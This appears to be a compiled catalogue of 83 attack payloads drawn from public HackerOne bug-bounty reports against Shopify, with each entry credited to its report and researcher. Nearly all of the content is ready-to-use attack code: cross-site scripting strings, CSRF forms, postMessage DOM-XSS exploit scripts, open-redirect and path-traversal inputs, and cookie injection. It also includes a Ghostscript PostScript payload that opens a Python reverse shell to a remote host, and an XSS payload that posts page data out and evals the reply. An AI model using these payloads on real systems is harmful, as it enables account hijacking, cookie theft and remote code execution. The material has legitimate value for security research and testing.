# Shopify

83 payloads.

### `56e13cfe`

```
referer=javascript:alert(document.cookie);
```

**Parameter:** `referer`
— [\[persistent cross-site scripting\] customers can target admins](https://hackerone.com/reports/55842) · Shopify · [akhil-reni](https://hackerone.com/akhil-reni)

### `3e0da9cd`

```
https://target.com/cart/1188733065:1?channel=buy_button&referer=javascript:alert(document.cookie
```

**Parameter:** `referer`
— [\[persistent cross-site scripting\] customers can target admins](https://hackerone.com/reports/55842) · Shopify · [akhil-reni](https://hackerone.com/akhil-reni)

### `82504332`

```
"><img src=x onerror=alert(document.domain)>
```

**Parameter:** `caption`
— [XSS in target.com](https://hackerone.com/reports/57459) · Shopify · [haxs101](https://hackerone.com/haxs101)

### `cc5ee822`

```
"><img src=x onerror=prompt(133)>
```

— [XSS at Bulk editing ProductVariants](https://hackerone.com/reports/72331) · Shopify · [mafia](https://hackerone.com/mafia) · $500.0

### `bbd926ab`

```
https://target.com/videos/pop-up-shop?x=');alert(1)//
```

**Parameter:** `x`
— [target.com XSS on blog pages via sharing buttons](https://hackerone.com/reports/87168) · Shopify · [reactors08](https://hackerone.com/reactors08) · $500.0

### `4a0dd659`

```
https://target.com/products/c-of-change?shop=evil.com&style=h%20.product-buy-button{x:expression(alert(1
```

**Parameter:** `style`
— [many xss in target.com](https://hackerone.com/reports/105659) · Shopify · [sergeym](https://hackerone.com/sergeym) · $500.0

### `6344d540`

```
javascript:alert(document.domain) //http://target.com/uploads/pwned.jpg
```

— [Strored Cross Site Scripting](https://hackerone.com/reports/106636) · Shopify · [hussein98d](https://hackerone.com/hussein98d) · $500.0

### `013af1b1`

```
<html>
<body>
 <img src="https://target.com/auth/twitter/disconnect">
  </body>
</html>
```

— [Twitter Disconnect CSRF](https://hackerone.com/reports/111216) · Shopify · [akhil-reni](https://hackerone.com/akhil-reni)

### `81be2891`

```
');alert('XSS
```

**Parameter:** `properties[builder_id]`
— [XSS on target.com](https://hackerone.com/reports/116006) · Shopify · [mdv](https://hackerone.com/mdv) · $500.0

### `e0cef4b2`

```
timezone=../../../etc/passwd
```

**Parameter:** `timezone`
— [File name and folder enumeration.](https://hackerone.com/reports/118688) · Shopify · [derision](https://hackerone.com/derision) · $500.0

### `a31d32f5`

```
timezone=../../../etc/passwd_error
```

**Parameter:** `timezone`
— [File name and folder enumeration.](https://hackerone.com/reports/118688) · Shopify · [derision](https://hackerone.com/derision) · $500.0

### `e4b2554d`

```
Page(function() {
Partners.VapSignupFunnel.partnerDashboardPageLoad(confirm(document.domain));
return {};
});
```

**Parameter:** `signup`
— [XSS on https://target.com/](https://hackerone.com/reports/126539) · Shopify · [secalert](https://hackerone.com/secalert) · $500.0

### `fd890885`

```
https://target.com/services/partners?signup=confirm(document.domain
```

**Parameter:** `signup`
— [XSS on https://target.com/](https://hackerone.com/reports/126539) · Shopify · [secalert](https://hackerone.com/secalert) · $500.0

### `bdc78e4d`

```
https://<shop>.target.com/admin/bulk?resource_name=Product&return_to=/..//evil.com
```

**Parameter:** `return_to`
— [Open redirect in bulk edit](https://hackerone.com/reports/169759) · Shopify · [zombiehelp54](https://hackerone.com/zombiehelp54)

### `8854c6e3`

```
<script>alert(2);</script>
```

— [Unauthenticated Stored XSS on <any>.target.com via checkout page](https://hackerone.com/reports/189378) · Shopify · [zombiehelp54](https://hackerone.com/zombiehelp54)

### `ddb806e6`

```
<html onmouseover=alert(1)>
```

— [Unauthenticated Stored XSS on <any>.target.com via checkout page](https://hackerone.com/reports/189378) · Shopify · [zombiehelp54](https://hackerone.com/zombiehelp54)

### `63fde2c1`

```
</title></head><html onmouseover=alert(2)>
```

**Parameter:** `first_name`
— [Unauthenticated Stored XSS on <any>.target.com via checkout page](https://hackerone.com/reports/189378) · Shopify · [zombiehelp54](https://hackerone.com/zombiehelp54)

### `88dc6a8e`

```
<form action="https://[shop].target.com/admin/products.json" method=post>
<input name="product[title]" value="API CSRF TEST">
<input name="product[vendor]" value="test">
<input name="product[body_html]" value="<h1>API CSRF TEST [Can be stored XSS for admins]</h1>">
 <input name="product[product_type]" value="test">
<input type=submit>
</form>
```

— [CSRF in all API endpoints when authenticated using HTTP Authentication](https://hackerone.com/reports/195156) · Shopify · [zombiehelp54](https://hackerone.com/zombiehelp54)

### `cdb26df4`

```
target.com/[app_id]?authenticity_token=[current_user_authenticity_token]
```

**Parameter:** `authenticity_token`
— [target.com - CSRF token leakage through Google Analytics](https://hackerone.com/reports/196458) · Shopify · [zombiehelp54](https://hackerone.com/zombiehelp54)

### `eb2b7867`

```
https://target.com/[attacker's_app]?authenticity_token=[victim's_token]
```

**Parameter:** `authenticity_token`
— [target.com - CSRF token leakage through Google Analytics](https://hackerone.com/reports/196458) · Shopify · [zombiehelp54](https://hackerone.com/zombiehelp54)

### `8fa898ce`

```
https://target.com/img-src-x-onerror-prompt2?reveal_support=true?authenticity_token=[Your_CSRF_TOKEN]&utf8=%E2%9C%93
```

**Parameter:** `authenticity_token`
— [target.com - CSRF token leakage through Google Analytics](https://hackerone.com/reports/196458) · Shopify · [zombiehelp54](https://hackerone.com/zombiehelp54)

### `2d89648f`

```
<script>
window.onload = function () { 
  window.setTimeout(function() {
              document.getElementById("token").innerHTML = "<iframe src='https://target.com/users/auth/shopify?shop=evil2.com'></iframe>";   
          }, 5000);
          window.setTimeout(function() {
               window.open('https://evil.com/v2.7/dialog/oauth?client_id=372033192897621&redirect_uri=https%3A%2F%2Fevil3.com%2Fseller/onboarding/1&response_type=code&scope=email%2Cmanage_pages%2C
```

— [Stealing users' facebook access tokens - target.com](https://hackerone.com/reports/211477) · Shopify · [zombiehelp54](https://hackerone.com/zombiehelp54)

### `b62ca76b`

```
alert(1)
```

— [Stored XSS in \[shop\].target.com/admin/orders/\[id\]](https://hackerone.com/reports/214044) · Shopify · [zombiehelp54](https://hackerone.com/zombiehelp54)

### `67c98c25`

```
POST /pages/175422/manual_posts/31163 HTTP/1.1
Host: target.com
<redacted>

-----------------------------15916813141840537191014403553
Content-Disposition: form-data; name="manual_post[link]"

javascript:alert(document.domain);//http://
-----------------------------15916813141840537191014403553
<redacted>
```

**Parameter:** `manual_post[link]`
— [Stored passive XSS at scheduled posts (target.com)](https://hackerone.com/reports/214581) · Shopify · [skavans](https://hackerone.com/skavans)

### `6e113c39`

```
window.open("javascript:window.opener.alert('bored-engineer')")
```

— [XSS in $shop$.target.com/admin/ via "Button Objects" in malicious app](https://hackerone.com/reports/217745) · Shopify · [bored-engineer](https://hackerone.com/bored-engineer) · $800.0

### `e5deaad3`

```
window.parent.postMessage(JSON.stringify({
  message: "Shopify.API.Bar.initialize",
  data: {
    buttons: {
      primary: {
        label: "Click here for XSS",
        href: "javascript:setTimeout('window.close()',1);window.opener.eval('alert(document.domain)');",
      }
    }
  }
}), "*");
```

**Parameter:** `href`
— [XSS in $shop$.target.com/admin/ via "Button Objects" in malicious app](https://hackerone.com/reports/217745) · Shopify · [bored-engineer](https://hackerone.com/bored-engineer) · $800.0

### `8ec148e7`

```
window.parent.postMessage(JSON.stringify({
  message: "Shopify.API.Modal.open",
  data: {
    src: "https://target.com",
    buttons: {
      primary: {
        label: "Click here for XSS",
        href: "javascript:setTimeout('window.close()',1);window.opener.eval('alert(document.domain)');",
      }
    }
  }
}), "*");
```

**Parameter:** `href`
— [XSS in $shop$.target.com/admin/ via "Button Objects" in malicious app](https://hackerone.com/reports/217745) · Shopify · [bored-engineer](https://hackerone.com/bored-engineer) · $800.0

### `ab3b40fd`

```
'-alert(document.domain)-'
```

**Parameter:** `value`
— [XSS in $shop$.target.com/admin/ via twine template injection in "Shopify.API.Modal.input" method when using a malicious app](https://hackerone.com/reports/217790) · Shopify · [bored-engineer](https://hackerone.com/bored-engineer) · $1,000.0

### `5062ab93`

```
https://target.com/?theme_handle=xx%27-alert(document.cookie)-%27&style_id=1&style_handle=1&preview_theme_id=<theme_ID>
```

**Parameter:** `theme_handle`
— [Reflected XSS in <any>.target.com through theme preview](https://hackerone.com/reports/226428) · Shopify · [zombiehelp54](https://hackerone.com/zombiehelp54)

### `8aad013f`

```
https://target.com/?theme_handle=xx%27-alert(document.cookie)-%27&style_id=1&style_handle=1&preview_theme_id=3572
```

**Parameter:** `theme_handle`
— [Reflected XSS in <any>.target.com through theme preview](https://hackerone.com/reports/226428) · Shopify · [zombiehelp54](https://hackerone.com/zombiehelp54)

### `10edb466`

```
let shop = prompt("Enter a Target Shop URL:", "https://target.com");
let frame = document.createElement("iframe");
frame.src = `${shop}/1337/digital_wallets/dialog`;
frame.style.display = "none";
frame.onload = () => {
  frame.contentWindow.postMessage({
    type: "DigitalWalletsDialog:change",
    digitalWalletsDialog: true,
    payload: {
      title: "placeholder",
      button: "placeholder",
      lineItems: [new File([""], "<img src=xx: onerror=alert(documen
```

— [XSS on any Shopify shop via abuse of the HTML5 structured clone algorithm in postMessage listener on "/:id/digital_wallets/dialog"](https://hackerone.com/reports/231053) · Shopify · [bored-engineer](https://hackerone.com/bored-engineer) · $3,000.0

### `94f007ff`

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE svg [
    <!ENTITY elem "">
]>
<svg onload="alert(document.domain);" height="16" width="16">
  &elem;
</svg>
```

— [XSS on $shop$.target.com/admin/ and evil.com via whitelist bypass in SVG icon for sales channel applications](https://hackerone.com/reports/232174) · Shopify · [bored-engineer](https://hackerone.com/bored-engineer) · $5,000.0

### `956ed8f7`

```
{
	"product": {
		"variants": [{
			"stripping": false,
			"title": "<option/><select/><img src=xx: onerror=alert('bored-engineer')>"
		}, {}],
		"options": [],
		"images": [{}],
		"image": {}
	}
}
```

— [XSS on "target.com" via "stripping" attribute and "shop" parameter](https://hackerone.com/reports/246794) · Shopify · [bored-engineer](https://hackerone.com/bored-engineer) · $1,000.0

### `2e48c925`

```
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
```

— [Tinymce 2.4.0](https://hackerone.com/reports/262230) · Shopify · [jelmer](https://hackerone.com/jelmer) · $2,000.0

### `5ebeda7b`

```
<HTML xmlns: ><audio>
<audio src=wp onerror=alert(0X1)>
```

— [Tinymce 2.4.0](https://hackerone.com/reports/262230) · Shopify · [jelmer](https://hackerone.com/jelmer) · $2,000.0

### `32067717`

```
<svg/onload=alert(document.cookie)>abcdef@test.com
```

— [stored xss in invited team member via email parameter](https://hackerone.com/reports/267177) · Shopify · [coldd](https://hackerone.com/coldd) · $500.0

### `3406da01`

```
<svg><!--?php "--><script>confirm(20)</script>?&gt;</svg>
```

— [Bypass Filter and get Stored Xss ](https://hackerone.com/reports/299424) · Shopify · [dr_dragon](https://hackerone.com/dr_dragon) · $3,000.0

### `acfc705e`

```
https://target.com/login?redirect=//acme
```

**Parameter:** `redirect`
— [target.com domain takeover](https://hackerone.com/reports/320355) · Shopify · [0xacb](https://hackerone.com/0xacb)

### `f68ae39d`

```
4- So change the any member name with hunter"><svg/onload=alert(2)>
```

**Parameter:** `member_name`
— [Stored XSS on activity](https://hackerone.com/reports/391390) · Shopify · [shazadsadiq](https://hackerone.com/shazadsadiq) · $2,000.0

### `dba4c847`

```
€{{amount}} "><img src=x onerror=prompt(document.domain)>
```

— [Stored XSS on buy button](https://hackerone.com/reports/397088) · Shopify · [tony_tsep](https://hackerone.com/tony_tsep) · $500.0

### `76d59813`

```
3-Put your street address xss payload (xss"><!--><svg/onload=alert(document.domain)>)
```

— [Stored xss](https://hackerone.com/reports/415484) · Shopify · [dr_dragon](https://hackerone.com/dr_dragon) · $1,000.0

### `2e0a093c`

```
Test <img src=x onerror=alert(2)>
```

— [H1514 Stored XSS in Return Magic App portal content](https://hackerone.com/reports/420459) · Shopify · [zombiehelp54](https://hackerone.com/zombiehelp54)

### `a0f7616a`

```
$$('iframe')[0].contentWindow.postMessage('{"message":"Shopify.API.setWindowLocation","data":"javascript:alert(document.domain);0[0]"}','*')
```

— [H1514 DOMXSS on Embedded SDK via Shopify.API.setWindowLocation abusing cookie Stuffing](https://hackerone.com/reports/422043) · Shopify · [filedescriptor](https://hackerone.com/filedescriptor)

### `6c16b466`

```
document.cookie = '_secure_admin_session_id=EVIL;path=/admin/oauth';
document.cookie = '_master_udr=EVIL;path=/admin/oauth';
```

— [H1514 DOMXSS on Embedded SDK via Shopify.API.setWindowLocation abusing cookie Stuffing](https://hackerone.com/reports/422043) · Shopify · [filedescriptor](https://hackerone.com/filedescriptor)

### `acc40d79`

```
1-Go to             >.target.com/admin/authenticate?return_url=javascript:alert(100)//
```

**Parameter:** `return_url`
— [Reflected XSS on $Any$.target.com/admin](https://hackerone.com/reports/422707) · Shopify · [dr_dragon](https://hackerone.com/dr_dragon) · $1,500.0

### `f69f2886`

```
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("█████",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);') currentdevice putdeviceprops
```

— [H1514 Remote Code Execution on kitcrm using bulk customer update of Priority Products](https://hackerone.com/reports/422944) · Shopify · [fransrosen](https://hackerone.com/fransrosen)

### `33e4a509`

```
sample-csv-sku.csv"-alert(document.domain)-"
```

**Parameter:** `price_list[csv_file_name]`
— [H1514 Stored XSS on Wholesale sales channel allows cross-organization data leakage](https://hackerone.com/reports/423454) · Shopify · [cablej](https://hackerone.com/cablej)

### `87d3ea4a`

```
https://target.com/auth?shop=%3C/noscript%3E%3Cimg%20src=x%20onerror=prompt(document.domain
```

**Parameter:** `shop`
— [Reflected XSS ](https://hackerone.com/reports/569241) · Shopify · [0xprial](https://hackerone.com/0xprial)

### `4c010e92`

```
<script>
  function attack(){
  	var ctx=window.open('https://target.com/admin/themes');
    var interval;
    interval=setInterval(function(){
      if(window.attackSuccess){
        clearInterval(interval);
      }else{
        ctx.postMessage(`{"message":"Shopify.API.remoteRedirect","data":{"location":"javascript:alert(document.domain)"}}`);
      }
    },500);;
  }
</script>
<a href="javascript:attack()" style="display:block;text-align:center;width:100%;height:300px;line-height:300
```

— [DOM XSS via Shopify.API.remoteRedirect](https://hackerone.com/reports/576532) · Shopify · [yxw21](https://hackerone.com/yxw21)

### `9f4c981d`

```
<script>[...something...]</script>
```

— [HTML injection in https://target.com/index.php?candidate=](https://hackerone.com/reports/601192) · Shopify · [pklfpklf](https://hackerone.com/pklfpklf)

### `8c6a1dec`

```
<script>
    function attack(){
        const ctx = window.open(location.origin+'/admin/themes', '_blank')
        const json = {
            message: "Shopify.API.Modal.initialize",
            data: {
                src: ""
            }
        }

        let interval;
        interval = setInterval(function(){
            if (window.attackSuccess) {
                clearInterval(interval)
            } else {
                ctx.postMessage(JSON.stringify(json)) // data.src == ""
          
```

— [DOM XSS via Shopify.API.Modal.initialize](https://hackerone.com/reports/602767) · Shopify · [tiago-danin](https://hackerone.com/tiago-danin) · $500.0

### `79f7e897`

```
<script>
	  function attack(){
	    let ctx=window.open('https://target.com'),interval;
	    let payload=btoa(`window.opener.postMessage('success',location.origin);alert(document.domain)`);
	    interval=setInterval(()=>{
	        ctx && ctx.postMessage({
        		"message":"Shopify.API.remoteRedirect",
        		"data":{
        			"location":`javascript:eval(atob('${payload}'))`
        		}
	        },location.origin);
	    },500);
	    window.onmessage=(e)=
```

— [██████ DOM XSS via Shopify.API.remoteRedirect](https://hackerone.com/reports/646505) · Shopify · [yxw21](https://hackerone.com/yxw21)

### `1c1a85c4`

```
<script>
alert("XSS By Tiago")
console.log("Document:", document)
console.log("Window:", window)
console.log("Cookies:", document.cookie)
console.log("Location:", window.location)
console.log("CSRF Token:", document.querySelectorAll('[data-serialized-id="csrf"]')[0].innerText)
</script>
```

— [Inject page in admin panel via Shopify.API.pushState](https://hackerone.com/reports/662083) · Shopify · [tiago-danin](https://hackerone.com/tiago-danin) · $500.0

### `04fd5893`

```
<script>
    function attack(){
        const ctx = window.open(location.origin+'/admin/themes', '_blank')
        const data = JSON.stringify({
            message: 'Shopify.API.pushState',
            data: {pathname: "/../pages/xss"}
        });

        let interval;
        interval = setInterval(function(){
            if (window.attackSuccess) {
                clearInterval(interval)
            } else {
                ctx.postMessage(data)
            }
        }, 500)
    }
    attack
```

— [Inject page in admin panel via Shopify.API.pushState](https://hackerone.com/reports/662083) · Shopify · [tiago-danin](https://hackerone.com/tiago-danin) · $500.0

### `291ac753`

```
https://target.com/services/login/identity?destination_uuid=79b5c315-b5ac-4b19-bd33-13554433fa31&google_apps_uri=javascript:prompt(document.domain
```

**Parameter:** `google_apps_uri`
— [XSS while logging using Google](https://hackerone.com/reports/691611) · Shopify · [ashketchum](https://hackerone.com/ashketchum) · $1,750.0

### `e871d0b0`

```
https://target.com/services/login/identity?destination_uuid=79b5c315-b5ac-4b19-bd33-13554433fa31&google_apps_uri=javascript:prompt(document.cookie
```

**Parameter:** `google_apps_uri`
— [XSS while logging using Google](https://hackerone.com/reports/691611) · Shopify · [ashketchum](https://hackerone.com/ashketchum) · $1,750.0

### `bcd905a3`

```
https://target.com/?contact[email]%20onfocus%3djavascript:alert(%27xss%27)%20autofocus%20a=a&form_type[a]aaa
```

**Parameter:** `contact[email]`
— [Reflective Cross-site Scripting via Newsletter Form](https://hackerone.com/reports/709336) · Shopify · [gam817](https://hackerone.com/gam817) · $2,000.0

### `375e6187`

```
<img src=1111111><img src=1111111><a href="javascript:alert&#40/1/&#41">axxx</a><svg></svg><img src=1>
```

— [Timeline Editor Self-XSS (Previous Fix #738072 Incomplete)](https://hackerone.com/reports/755679) · Shopify · [mosuan](https://hackerone.com/mosuan) · $500.0

### `8e4af365`

```
javascript:alert(1)//https://target.com
```

— [Stored XSS in Shopify Chat ](https://hackerone.com/reports/756729) · Shopify · [mosuan](https://hackerone.com/mosuan) · $500.0

### `838402dd`

```
https://target.com/cookie.php?cookie=document.cookie
```

— [xss stored](https://hackerone.com/reports/798599) · Shopify · [davscol94](https://hackerone.com/davscol94)

### `a8569524`

```
<script>
function attack(){
    const ctx = window.open(location.origin+'/admin/themes', '_blank')
    const data = JSON.stringify({
        message: 'Shopify.API.pushState',
        data: {pathname: "invalid:pages/xss"}
    });

    let interval;
    interval = setInterval(function(){
        if (window.attackSuccess) {
            clearInterval(interval)
        } else {
            ctx.postMessage(data)
        }
    }, 500)
}
attack()
</script>
<a href="javascript:attack()" style="display:bl
```

— [Inject page in admin panel via Shopify.API.pushState with protocol invalid](https://hackerone.com/reports/868615) · Shopify · [tiago-danin](https://hackerone.com/tiago-danin) · $500.0

### `86aec4c2`

```
<img src="a:" onerror="var t=setTimeout;t(function(){var b=function(d){var x=new XMLHttpRequest;t(function(){eval(x.responseText)},2000);x.open('POST','https://target.com');x.send(d)};window.parent.postMessage(b(document.head.innerHTML),'*');},2000)"/>
```

— [XSS within Shopify Email App - Admin](https://hackerone.com/reports/869831) · Shopify · [imgnotfound](https://hackerone.com/imgnotfound)

### `ca7e1738`

```
GET /apps/ss/b.php/../../?shop=a&Shop=asd HTTP/1.1
Host: ███████
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
```

— [Path Traversal in App Proxy](https://hackerone.com/reports/869888) · Shopify · [ngalog](https://hackerone.com/ngalog)

### `06c9ec7e`

```
https://target.com/admin/menus/new                                             "><img src="x" onerror="alert(document.cookie)">
```

— [xss stored in https://your target.com/admin/](https://hackerone.com/reports/887879) · Shopify · [lbro](https://hackerone.com/lbro) · $1,000.0

### `20a58cc7`

```
POST /api/v1/arro_token?access_token=███████&myshopify_domain=target.com&id=42668326968 HTTP/1.1
Host: evil.com
Content-Type: application/json
Cookie: 
Connection: close
Accept: application/json
X-DeviceID: 
User-Agent: Shopify Ping/iOS/2.5.4 (iPhone12,3/com.shopify.ping/13.1.1) - Build 3006
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Content-Length: 0
```

**Parameter:** `access_token`
— [Low privileged user can create high privileged user's KITCRM authorization token and can read and write message to KIT](https://hackerone.com/reports/909863) · Shopify · [sandeep_rj49](https://hackerone.com/sandeep_rj49)

### `5afc3b0b`

```
�PNG
�
IHDRdp�TtEXtSoftwareAdobe ImageReadyq�e<9tEXtComment"><script>alert(prompt('XSS BY ZEROX4'))</script>
                                                                                                    /-{IDATx���E��K��s�9xd$#���J� %IR$�(���s�9Ñ������evnv���>����q�;;;S�U������\.����=��=�ܿ��BCb����QHyԑEYՑ�s$s�T�:�x���8���إ�}2`���0P����@�(��j�(����D�J�d�%[�
```

— [XSS Stored via Upload avatar PNG \[HTML\] File in target.com](https://hackerone.com/reports/964550) · Shopify · [zerox4](https://hackerone.com/zerox4)

### `fdc9eb4b`

```
"><img src=a onerror=alert(1)>123@sdf.com
```

**Parameter:** `email`
— [Self xss in product reviews](https://hackerone.com/reports/1029668) · Shopify · [tomorrow_future](https://hackerone.com/tomorrow_future)

### `76db1016`

```
1234567"><img src=a onerror=alert(1)>
```

— [XSS stored in the Shopify Email app](https://hackerone.com/reports/1033882) · Shopify · [tomorrow_future](https://hackerone.com/tomorrow_future)

### `683db35e`

```
ga("create", {
	"name": "pwn",
	"trackingId": "UA-44361710-4",
	"cookieName": "injectedCookie=value;"
})
// [snip]
document.cookie = "injectedCookie=value;=GA1.3.614842418.1609270420; path=/; expires=Thu, 19 Jan 2023 03:18:11 GMT; domain=target.com;"
```

**Parameter:** `cookieName`
— [\[redacted\]](https://hackerone.com/reports/1081167) · Shopify · [bored-engineer](https://hackerone.com/bored-engineer) · $1,600.0

### `7792093d`

```
> <img src=x onerror=prompt(document.domain)>
```

**Parameter:** `description`
— [\[h1-2102\] Stored XSS in product description via `productUpdate` GraphQL query leads to XSS at target.com/products/\[ID\]](https://hackerone.com/reports/1085546) · Shopify · [intidc](https://hackerone.com/intidc) · $1,600.0

### `42ad5491`

```
am start -W -a android.intent.action.VIEW -d "https://target.com/admin/collections/../../
```

**Parameter:** `d`
— [Improper deep link validation ](https://hackerone.com/reports/1087744) · Shopify · [fr4via](https://hackerone.com/fr4via)

### `1ef190fb`

```
luc1d"><img/src="x"onerror=alert(document.domain)>@wearehackerone.com
```

**Parameter:** `email`
— [Stored XSS on target.com](https://hackerone.com/reports/1107726) · Shopify · [luc1d](https://hackerone.com/luc1d)

### `46c410b7`

```
https://target.com/blogsearch?q=OnMoUsEoVeR=prompt(/hacked/)//
```

**Parameter:** `q`
— [XSS  at https://target.com/blogsearch](https://hackerone.com/reports/1145162) · Shopify · [zqgnd](https://hackerone.com/zqgnd)

### `06a69864`

```
<svg onload="var req = new XMLHttpRequest(); req.open('GET', 'https://target.com/admin', false); req.setRequestHeader('Upgrade-Insecure-Requests', '1');req.setRequestHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36') ;req.send(null);var headers = req.response.toLowerCase();console.log(headers);" xmlns="http://evil.com/2000/svg" xmlns:xlink="http://evil.com/1999/xlink" version=
```

— [Stored XSS in SVG file as data: url](https://hackerone.com/reports/1276742) · Shopify · [irisrumtub](https://hackerone.com/irisrumtub) · $5,300.0

### `2907d23c`

```
2. visit it:             >:<port>/poc.html?x=${alert(1)}
```

**Parameter:** `x`
— [One Click XSS in \[target.com\]](https://hackerone.com/reports/1563334) · Shopify · [comwrg](https://hackerone.com/comwrg)

### `08394dce`

```
<object type="text/x-scriptlet" data="https://target.com/scriptlet.html"></object>
```

**Parameter:** `last_name`
— [Stored XSS in Dovetale by application of creator](https://hackerone.com/reports/1652046) · Shopify · [kun_19](https://hackerone.com/kun_19) · $1,600.0

### `acfdbb03`

```
https://target.com/creator/auth/login?creator_redirect=javascript:alert(document.domain)
```

**Parameter:** `creator_redirect`
— [Cross-site scripting on target.com](https://hackerone.com/reports/1672459) · Shopify · [kun_19](https://hackerone.com/kun_19) · $1,600.0

### `58861217`

```
https://target.com/markets?utm_source=INJECTION%22%20style=%22animation-name:swoop-up%22%20onanimationstart=%22alert(document.domain)
```

**Parameter:** `utm_source`
— [XSS in target.com/markets?utm_source=](https://hackerone.com/reports/1699762) · Shopify · [noblesix](https://hackerone.com/noblesix)

### `328e22e7`

```
injection%22%20style=%22animation-name:swoop-up%22%20onanimationstart=%22alert(document.domain)
```

**Parameter:** `utm_source`
— [XSS in target.com/markets?utm_source=](https://hackerone.com/reports/1699762) · Shopify · [noblesix](https://hackerone.com/noblesix)

### `a061d681`

```
https://[YOUR-SHOP].target.com/admin/marketing/reports/[MARKETING-CAMPAIGN-ID]?return_page_pathname=javascript:alert('xss')&return_page_title=Marketing%20overview
```

**Parameter:** `return_page_pathname`
— [Reflected XSS In Marketing Reports Page On *.target.com/admin](https://hackerone.com/reports/1754843) · Shopify · [raymondlind8](https://hackerone.com/raymondlind8)

### `6bcce4f8`

```
POST /api/shopify/██████?operation=BillingDocumentDownload&type=mutation HTTP/2
Host: target.com
Cookie: ██████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
X-Shopify-Web-Force-Proxy: 1
X-Csrf-Token: ████
Caller-Pathname: /store/█████████/access_account/invoice/██████
Content-Length: 433
Origin: https://target.com
S
```

**Parameter:** `id`
— [IDOR on GraphQL queries BillingDocumentDownload and BillDetails](https://hackerone.com/reports/2207248) · Shopify · [blaklis](https://hackerone.com/blaklis) · $5,000.0

### `a6cc20f6`

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shopify Search Form</title>
</head>
<body>
    Please hold...
    
    <form id="post-form" action="https://target.com/en/search?_data=routes%2F%28%24locale%29.search" method="POST">
        <input type="hidden" name="query" value="Is this XSS?">
        <input type="hidden" name="greeting" value="![Mouse wheel click here for more info...]
```

**Parameter:** `greeting`
— [Reflected XSS in AI Chat Bot Greetings at target.com via Markdown Image Rendering](https://hackerone.com/reports/2509022) · Shopify · [saltymermaid](https://hackerone.com/saltymermaid) · $1,600.0

### `edb0ed81`

```
system("id>/tmp/pwned")
```

— [mruby-engine: UAF in MRubyEngine#initialize enables local RCE](https://hackerone.com/reports/3679660) · Shopify · [0xd0ff9](https://hackerone.com/0xd0ff9)
